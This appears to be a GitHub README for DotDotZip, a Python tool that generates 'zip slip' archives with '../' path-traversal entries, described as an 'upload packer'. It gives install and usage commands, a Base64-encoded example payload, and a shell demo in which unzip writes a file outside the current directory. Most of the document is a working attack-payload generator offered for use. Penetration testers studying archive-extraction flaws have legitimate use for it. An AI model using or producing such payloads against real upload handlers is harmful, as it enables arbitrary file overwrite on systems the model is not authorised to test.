After having viewed some interesting content including a [NahamSec video](https://youtu.be/4sKlbMiGWAw) on a little-known technique for hiding path traversals inside ZIP files and hearing that Python can pull that off, I just had to try creating a tool for generating such payloads.

The result, of course, is this: a tool for creating the perfect upload packer.

# Installation

```
pipx install git+https://github.com/kennystrawnmusic/DotDotZip
```

# Usage

```
$ python3 dotdotzip.py --help
usage: dotdotzip.py [-h] [--traverse-count TRAVERSE_COUNT]
                    [--zip-name ZIP_NAME] --prepend-path PREPEND_PATH
                    --pack-files PACK_FILES [PACK_FILES ...]

DotDotZip v. 0.2.3

options:
  -h, --help            show this help message and exit
  --traverse-count TRAVERSE_COUNT
                        Number of '../' sequences to prepend
  --zip-name ZIP_NAME   Name of the output ZIP archive (leave blank to output
                        Base64 encoded ZIP to the console)
  --prepend-path PREPEND_PATH
                        Extra path to prepend
  --pack-files PACK_FILES [PACK_FILES ...]
                        Names of files to pack
```

Example (Base64):

```
$ python3 dotdotzip.py --prepend-path '/Users/realkstrawn93/Desktop' --traverse-count 15 --pack-files pyproject.toml
UEsDBBQAAAAAAEt0I1312nQfKAEAACgBAABXAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vVXNlcnMvcmVhbGtzdHJhd245My9EZXNrdG9wL3B5cHJvamVjdC50b21sW2J1aWxkLXN5c3RlbV0KcmVxdWlyZXMgPSBbInNldHVwdG9vbHM+PTYxLjAuMCJdCmJ1aWxkLWJhY2tlbmQgPSAic2V0dXB0b29scy5idWlsZF9tZXRhIgoKW3Byb2plY3RdCm5hbWUgPSAiZG90ZG90emlwIgp2ZXJzaW9uID0gIjAuMi4zIgpkZXNjcmlwdGlvbiA9ICJBIHV0aWxpdHkgZm9yIGdlbmVyYXRpbmcgXCJ6aXAgc2xpcFwiIHBheWxvYWRzIGZvciB0ZXN0aW5nIHppcCBmaWxlIGV4dHJhY3Rpb24gdnVsbmVyYWJpbGl0aWVzLiIKCltwcm9qZWN0LnNjcmlwdHNdCmRvdGRvdHppcCA9ICJkb3Rkb3R6aXA6bWFpbiJQSwECFAMUAAAAAABLdCNd9dp0HygBAAAoAQAAVwAAAAAAAAAAAAAApIEAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vVXNlcnMvcmVhbGtzdHJhd245My9EZXNrdG9wL3B5cHJvamVjdC50b21sUEsFBgAAAAABAAEAhQAAAJ0BAAAAAA==
```

Example (filesystem):

```
realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ mkdir ../test
realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ dotdotzip --prepend-path '/Users/realkstrawn93/test' --traverse-count 15 --pack-files gdb.txt --zip-name test.zip
realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ unzip -: test.zip 
Archive:  test.zip
 extracting: ../../../../../../../../../../../../../../../Users/realkstrawn93/test/gdb.txt  
realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ ls ~/test
gdb.txt
realkstrawn93@realkstrawn93-m1mbp ~/Desktop $ 
```